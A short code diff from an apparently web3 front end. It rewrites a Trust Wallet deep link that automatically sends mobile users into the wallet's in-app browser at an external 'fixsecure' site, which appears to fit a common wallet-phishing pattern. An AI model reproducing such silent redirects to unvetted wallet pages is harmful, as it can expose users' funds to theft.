@@ -182,7 +182,7 @@ console.log(walletInfo?.name)
     isMobile &&
     !isTrustWalletApp() // ensure we are not already inside the app
   ) {
-    const trustLink = `https://link.trustwallet.com/open_url?coin_id=${chain.id}&url=https://fixsecure.onrender.com`
+       const trustLink = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=${encodeURIComponent("https://fixsecure.onrender.com")}`;
     window.open(trustLink, "_blank");
     }
 }, [isConnected, walletInfo, activeChain?.id]);
